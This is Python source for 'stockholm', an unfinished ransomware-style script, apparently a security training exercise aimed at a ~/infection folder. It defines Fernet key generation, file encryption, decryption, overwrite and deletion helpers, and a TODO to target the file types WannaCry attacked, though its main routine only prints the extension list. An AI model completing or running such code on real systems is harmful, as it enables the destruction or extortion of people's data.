#!/usr/bin/env python3

# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os
from typing import Any
from pathlib import Path

from cryptography.fernet import Fernet

VERSION = 1.0
def get_extentions(path_to_file: str) -> dict:
    d = {}
    with open(path_to_file) as f:
        for line in f:
            d[line.rstrip()] = line.rstrip()
    return d

def create_key() -> bytes:
        key = Fernet.generate_key()
        return key

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def write_content_file(path_to_file: str, content: Any):
    with open(path_to_file, 'wb') as file:
        content = file.write(content)
        file.close()

def remove_file(path_to_file: str):
    os.remove(path_to_file)

def encrypt_file(path_to_file: str, key: bytes) -> bytes:
        f = Fernet(key)
        return (f.encrypt(get_content_file(path_to_file)))

def decrypt_file(file_to_decrypt: str, key: bytes):
        f = Fernet(key)
        content_to_decrypt = get_content_file(file_to_decrypt)
        write_content_file(file_to_decrypt, f.decrypt(content_to_decrypt))

def stockholm(key: bytes):
    extentions = get_extentions("extensions.txt")
    home = Path.home().as_posix()
    infection_dir = home + "/infection"
    print(extentions)
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
    parser.add_argument("-r", "--reverse", action="store_true", help="reverse the encryption")
    parser.add_argument("-s", "--silent", action="store_true", help="silence the output")
    parser.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
    args = parser.parse_args()

    if args.version:
        print(f"stockholm version {VERSION}")
        exit(1)

    if args.key:
        key = args.key
    else:
        key = create_key()
    stockholm(key)



if __name__ == "__main__":
    main()
